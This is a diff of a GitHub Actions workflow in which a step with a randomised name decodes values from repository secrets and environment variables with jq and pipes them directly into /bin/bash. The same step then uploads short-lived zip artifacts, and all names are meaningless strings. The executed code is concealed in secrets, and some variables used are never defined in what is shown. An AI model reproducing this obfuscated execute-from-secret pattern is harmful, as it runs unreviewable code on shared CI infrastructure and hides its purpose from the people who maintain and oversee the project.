@@ -9,15 +9,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: caddywebsocket356
         env:
-          skev8561: ${{ secrets.skev8561 }}
+          uwqmu21: ${{ secrets.uwqmu21 }}
         run: |
-          printf '%s' "$skev8561" | jq -r .en20 | /bin/bash
-          printf '%s' "$qqax5" | jq -r .jqaqh20809 | /bin/bash
-          echo $sg3499 | jq -r .bdkdm497 | /bin/bash
+          printf '%s' "$uwqmu21" | jq -r .j1516 | /bin/bash
+          echo $t87 | jq -r .tpq4 | /bin/bash
+          printf '%s' "$jfqy0682" | jq -r .klrxk47 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: OiCmfPkt
+          name: cO2GyYhM
           path: "*.zip"
           retention-days: 1
